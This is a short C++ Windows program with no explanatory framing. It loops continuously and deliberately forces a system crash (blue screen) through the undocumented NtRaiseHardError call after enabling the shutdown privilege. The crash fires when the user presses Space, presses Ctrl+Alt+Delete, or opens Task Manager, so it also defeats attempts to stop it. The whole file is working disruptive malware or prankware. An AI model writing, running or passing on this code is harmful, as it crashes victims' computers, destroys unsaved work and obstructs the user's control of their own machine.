#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <winternl.h>
using namespace std;
DWORD FindProcessId(char* processName)
{
    // strip path

    char* p = strrchr(processName, '\\');
    if (p)
        processName = p + 1;

    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!strcmp(processName, processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!strcmp(processName, processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
int main()
{
    while (true)
    {
        if (GetAsyncKeyState(VK_SPACE) || GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_MENU) && GetAsyncKeyState(VK_DELETE) || FindProcessId((char*)"Taskmgr.exe") != 0)
        {
            BOOLEAN bEnabled;
            ULONG uResp;
            LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
            LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
            pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
            pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
            NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
            NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
            return 0;
        }
    }
}